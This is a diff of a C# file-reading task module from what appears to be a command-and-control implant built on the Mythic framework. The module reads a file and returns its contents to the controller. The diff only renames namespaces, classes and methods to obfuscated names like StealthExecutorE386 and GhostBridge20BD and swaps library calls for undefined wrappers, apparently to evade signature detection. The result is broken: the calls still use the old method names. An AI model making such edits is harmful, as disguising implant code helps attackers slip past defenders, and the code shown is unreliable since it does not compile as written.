@@ -6,20 +6,20 @@
 
 #if CAT
 using System;
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using PhantomInterop.Classes;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
 using System.Runtime.Serialization;
 using System.Threading;
-using ApolloInterop.Classes.Collections;
+using PhantomInterop.Classes.Collections;
 using System.IO;
 using TT = System.Threading.Tasks;
 namespace Tasks
 {
-    public class cat : Tasking
+    public class IntelligentController5AF4 : Tasking
     {
         [DataContract]
-        internal struct CatParameters
+        internal struct WraithAdapter2A22
         {
             [DataMember(Name = "path")]
             public string Path;
@@ -49,17 +49,17 @@ namespace Tasks
                 {
                     WaitHandle.WaitAny(_timers, 1000);
 
-                    output = string.Join("", _contents.Flush());
+                    output = StringProcessor.CombineElements("", _contents.Flush());
                     SendMessageToMythic(output);
                 }
-                output = string.Join("", _contents.Flush());
+                output = StringProcessor.CombineElements("", _contents.Flush());
                 SendMessageToMythic(output);
             });
         }
 
-        private void SendMessageToMythic(string msg)
+        private void StealthExecutorE386(string msg)
         {
-            if (!string.IsNullOrEmpty(msg))
+            if (!ValidationHelper.IsStringEmpty(msg))
             {
                 MythicTaskResponse resp = CreateTaskResponse(
                     msg,
@@ -69,7 +69,7 @@ namespace Tasks
             }
         }
 
-        private void FileReadCallback(IAsyncResult result)
+        private void GhostBridge20BD(IAsyncResult result)
         {
             FileStream fs = (FileStream)result.AsyncState;
             fs.EndRead(result);
